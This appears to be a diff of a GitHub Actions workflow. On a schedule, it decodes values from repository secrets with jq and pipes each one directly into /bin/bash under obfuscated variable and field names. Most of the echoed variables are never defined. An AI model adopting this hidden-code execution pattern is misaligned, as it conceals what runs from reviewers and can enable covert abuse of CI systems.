@@ -3,23 +3,26 @@ name: xinglianjiqian
 on:
   workflow_dispatch:
   schedule:
-    - cron: '46 3/6 * * *'
+    - cron: '31 0/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: xinglianjiqian
         env:
-          g65314: ${{ secrets.g65314 }}
+          ya3: ${{ secrets.ya3 }}
         run: |
-          echo $g65314 | jq -r .hccae8 | /bin/bash
-          echo $unj38 | jq -r .riyc844 | /bin/bash
-          echo $zdn03 | jq -r .u2808 | /bin/bash
-          echo $nrmw52 | jq -r .leuiq2662 | /bin/bash
-          echo $z5 | jq -r .itlr50 | /bin/bash
-          echo $tnr76688 | jq -r .c9 | /bin/bash
-          echo $tuk73998 | jq -r .hyaw66 | /bin/bash
+          echo $ya3 | jq -r .gdu3 | /bin/bash
+          echo $h7 | jq -r .amxh45 | /bin/bash
+          echo $yibm8 | jq -r .mb2319 | /bin/bash
+          echo $oxmkk67061 | jq -r .lnyc2800 | /bin/bash
+          echo $e45470 | jq -r .wql8455 | /bin/bash
+          echo $sj97 | jq -r .wzy7593 | /bin/bash
+          echo $xmmm49005 | jq -r .hek484 | /bin/bash
+          echo $dak36303 | jq -r .ml18 | /bin/bash
+          echo $qpff13 | jq -r .ve95 | /bin/bash
+          echo $y2 | jq -r .tuj076 | /bin/bash
+          echo $lf8 | jq -r .ejpdu02 | /bin/bash
 
